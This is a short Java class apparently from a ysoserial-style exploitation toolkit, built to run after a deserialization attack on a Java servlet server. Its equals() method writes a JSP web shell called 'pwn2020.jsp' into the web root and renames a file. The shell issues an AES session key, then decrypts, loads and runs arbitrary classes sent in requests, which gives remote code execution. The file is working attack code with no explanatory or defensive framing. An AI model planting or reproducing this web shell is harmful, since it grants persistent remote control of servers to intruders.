package ysoserial.payloads.util;

import java.io.File;
import java.io.FileOutputStream;
import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.jsp.PageContext;

public class X3_upf {
   public X3_upf() {
   }

   public boolean equals(Object var1) {
      ServletOutputStream var2 = null;

      try {
         PageContext var3 = (PageContext)var1;
         var2 = ((HttpServletResponse)var3.getResponse()).getOutputStream();
         byte[] var4 = "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if(request.getParameter(\"testbtxxx\")!=null){String k=(\"\"+UUID.randomUUID()).replace(\"-\",\"\").substring(16);session.putValue(\"u\",k);out.print(k);return;}Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec((session.getValue(\"u\")+\"\").getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%>".getBytes();
         String var5 = var3.getServletContext().getResource("/").toString().concat("pwn2020.jsp");
         var5 = var5.replace("file:", "");
         FileOutputStream var6 = new FileOutputStream(var5);
         var6.write(var4);
         var6.close();
         File var7 = new File(var5.replaceAll("pwn2020", "x3"));
         if (var7.exists()) {
            var7.renameTo(new File(var5.replaceAll("pwn2020", "tmpbutian")));
         }
      } catch (Exception var8) {
      }

      return true;
   }
}
